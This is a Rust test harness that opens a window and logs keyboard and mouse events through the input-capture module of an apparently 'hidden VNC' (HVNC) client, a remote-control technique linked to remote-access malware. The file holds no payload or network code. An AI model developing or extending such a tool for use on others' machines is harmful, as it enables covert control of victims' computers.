use std::time::Duration;
use tokio::time::sleep;
use log::{info, debug};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::init();
    
    info!("🧪 Testing HVNC Client Input Capture");
    
    // Create a simple minifb window to test input capture
    use minifb::{Window, WindowOptions, Key, MouseButton};
    
    let mut window = Window::new(
        "HVNC Input Test - Click and type to test input capture",
        800,
        600,
        WindowOptions::default(),
    )?;
    
    // Create input capture system
    use hidden_vnc::client::input::InputCapture;
    let mut input_capture = InputCapture::new();
    input_capture.update_coordinate_scale((800, 600), (1439, 654));
    
    info!("🎯 Window created. Click and type in the window to test input capture.");
    info!("📏 Coordinate scale set to map 800x600 client to 1439x654 server");
    
    let mut frame_count = 0;
    
    // Keep the window open and capture input events
    while window.is_open() && !window.is_key_down(Key::Escape) {
        frame_count += 1;
        
        // Capture input events
        let events = input_capture.capture_events(&window);
        
        if !events.is_empty() {
            info!("🎮 Frame {}: Captured {} input events:", frame_count, events.len());
            for (i, event) in events.iter().enumerate() {
                info!("  Event {}: {:?}", i + 1, event);
            }
        }
        
        // Get input statistics
        let stats = input_capture.get_input_stats();
        if frame_count % 60 == 0 { // Log stats every 60 frames (~1 second)
            debug!("📊 Input Stats: {} keys, {} mouse buttons, scale: {:?}, sensitivity: {:.2}, has_mouse: {}", 
                  stats.pressed_keys_count, 
                  stats.pressed_mouse_buttons_count,
                  stats.coordinate_scale,
                  stats.mouse_sensitivity,
                  stats.has_mouse_position);
        }
        
        // Update the window (with a simple buffer)
        let buffer: Vec<u32> = vec![0x00FF00FF; 800 * 600]; // Green background
        window.update_with_buffer(&buffer, 800, 600)?;
        
        // Small delay to prevent excessive CPU usage
        sleep(Duration::from_millis(16)).await; // ~60 FPS
    }
    
    info!("🏁 Input test completed. Press Escape to exit.");
    Ok(())
}